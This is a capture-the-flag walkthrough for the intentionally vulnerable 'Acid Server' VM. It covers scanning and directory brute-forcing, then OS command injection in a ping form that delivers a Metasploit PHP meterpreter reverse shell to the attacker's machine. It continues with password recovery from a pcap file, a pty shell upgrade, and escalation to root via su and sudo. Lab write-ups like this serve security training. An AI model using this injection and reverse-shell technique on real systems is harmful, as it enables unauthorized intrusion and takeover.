@@ -1,0 +1,390 @@
+
+								
+																		Hack the Acid VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on November 5, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									The name of the Virtual machine is “Acid Server” that we are going to crack.  It is a Boot2Root VM that we are going to solve. This is a web-based VM. Our main goal is to escalate the privileges to root and capture the flag.
+You can download it from à https://www.vulnhub.com/entry/acid-server,125/
+Penetration Methodology:
+
+Network Scanning (Nmap, netdiscover)
+Directory Brute-force (dirbuster)
+Abusing web page for OS command vulnerability
+Exploit OS command vulnerability (Metasploit)
+Gain unauthorized access into the victim’s machine
+Search and download pcap file
+Steal password from inside pcap file (Wireshark)
+Get into the shell for privilege escalation
+Import python one-liner for proper TTY shell
+Switch user (su) and submit the stolen password
+Take root access and capture the flag
+
+As always start by finding the target.
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+Our target is 192.168.1.103, now fire up nmap to scan the ports.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.103
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.103
+					
+				
+			
+		
+
+
+Nmap results are showing that there is only one port open i.e. 33447 with the services of HTTP. Please observe here that port 80 is not open that means if we want to open this IP in the browser then we have to use the port number as it will not open it by default. So now open the web page using the port number 33447.
+
+There are only a heading and a quote on the page; nothing else but if you look at the tab on the browser, it says “/Challenge”. This can be a directory. Let’s open it.
+
+Upon opening /Challenge, a login portal will open. Let’s learn more about /Challenge by using DirBuster. Copy the link from the browser in Target URL box and then select 2.3-medium word list in Files with the list of dirs/files box by clicking on the browse button. And then click on Start.
+
+Clicking on start button will provide the list of directories
+
+I went through every directory but the only cake.php was useful. Open it in the browser. When you open cake.php, the page says “ah.haan…There is long way to go..dude J”. But upon looking closely you will find the /Magic_Box is written on the tab. Let’s open it in the URL just like before.
+
+When you open the /Magic_Box it says that access to the page is forbidden. OK! There is no problem with that. 
+
+Let’s use DirBuster again on it. Give the URL http://192.168.1.103:33447/Challenges/Magic/box and 2.3 medium wordlists just as before and then click on start button.
+In the result, it will show the name of the directories
+
+Out of all those command.php is the only one that has proved to be useful. Open it in the URL. Here you will find a ping portal that means you can ping any IP address from here. Let’s try and ping an IP. (You can ping any IP but I am going to ping the default IP i.e. 127.0.0.1).
+Once the IP has been pinged, go to the page source. On the page source, you can contemplate that the results of ping are showing.
+
+Hence there are possibilities for OS command Injection and to ensure let’s run any arbitrary command such as; ls as shown above. On the page source, you can contemplate that results of ls command.
+
+Since the page is showing the desired result that means we can use this portal to inject our virus using the web_delivery exploit. And to do so, go to the terminal of Kali an open Metasploit by typing msfconsole and then further type :
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/script/web_delivery
+msf exploit(multi/script/web_delivery) set target 1
+msf exploit(multi/script/web_delivery) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/script/web_delivery) set lhost 192.168.1.108
+msf exploit(multi/script/web_delivery) set lport 4444
+msf exploit(multi/script/web_delivery) exploit
+			
+				
+					
+				
+					123456
+				
+						msf use exploit/multi/script/web_deliverymsf exploit(multi/script/web_delivery) set target 1msf exploit(multi/script/web_delivery) set payload php/meterpreter/reverse_tcpmsf exploit(multi/script/web_delivery) set lhost 192.168.1.108msf exploit(multi/script/web_delivery) set lport 4444msf exploit(multi/script/web_delivery) exploit
+					
+				
+			
+		
+
+This exploit is a multi-exploit that means it can be used on multiple programs. Therefore, I have set the target as one because 1 refers to php and as we are using php payload we have to set the target as 1.
+
+Now performing this exploit will give you a code. Copy this code and paste it on the ping portal after the IP that you are using to ping. And to add this code use semi-colon (;).
+127.0.0.1; *&lt;code&gt;*
+
+As soon as you click on submit, you will have a meterpreter session in Metasploit. Further type the following command to see the list of directories:
+
+		
+		
+			
+			
+			
+			
+ls / l
+			
+				
+					
+				
+					1
+				
+						ls / l
+					
+				
+			
+		
+
+In the list, you will find a directory called s.bin. Let’s go into the folder and see its list of files and for that type:
+
+		
+		
+			
+			
+			
+			
+cd /s.bin
+ls
+			
+				
+					
+				
+					12
+				
+						cd /s.binls
+					
+				
+			
+		
+
+Here, you will find a php file. Let’s read it.
+
+		
+		
+			
+			
+			
+			
+cat invesgitate.php
+			
+				
+					
+				
+					1
+				
+						cat invesgitate.php
+					
+				
+			
+		
+
+When you read it, it shows you a message i.e. “now you have to behave like an investigator to catch the culprit”.
+
+In the list of the directory that was previously previewed also had a folder sbin. Let’s get into that folder and see the lists of files and to do so type:
+
+		
+		
+			
+			
+			
+			
+cd s.bin
+ls
+			
+				
+					
+				
+					12
+				
+						cd s.binls
+					
+				
+			
+		
+
+
+In the list of files, you can see a file named raw_vs_isi. Let’s check it out.
+
+		
+		
+			
+			
+			
+			
+cd raw_vs_isi
+ls
+			
+				
+					
+				
+					12
+				
+						cd raw_vs_isils
+					
+				
+			
+		
+
+It contains only one file, called hint.pcapng. Let’s download it on our desktop with help of the following command.
+
+		
+		
+			
+			
+			
+			
+download hint.pcapng /root/Desktop
+			
+				
+					
+				
+					1
+				
+						download hint.pcapng /root/Desktop
+					
+				
+			
+		
+
+
+Now the file is downloaded on your desktop. I explored it every packet and found a conversation in the TCP stream of the 90th packet. Just right-click on the said packet and then click on Follow option and then select TCP stream.
+
+It will open the conversation as shown in the image below:
+
+In the conversation, one of them says “saman and nowadays he’s known by the alias of 1337hax0r” that means saman is the username and 1337hax0r can be the password. Let’s try it. Then to access proper TTY shell we had import python one line script and Type following command to reach the terminal and here log in with the username we just found:
+
+		
+		
+			
+			
+			
+			
+shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+su saman
+1337hax0r
+sudo su
+1337hax0r
+			
+				
+					
+				
+					123456
+				
+						shellpython -c 'import pty;pty.spawn("/bin/bash")'su saman1337hax0rsudo su1337hax0r
+					
+				
+			
+		
+
+And so you have entered the root. Now go into the folder root and see what it has to offer:
+
+		
+		
+			
+			
+			
+			
+cd /root
+ls
+cat flag.txt
+			
+				
+					
+				
+					123
+				
+						cd /rootlscat flag.txt
+					
+				
+			
+		
+
+
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
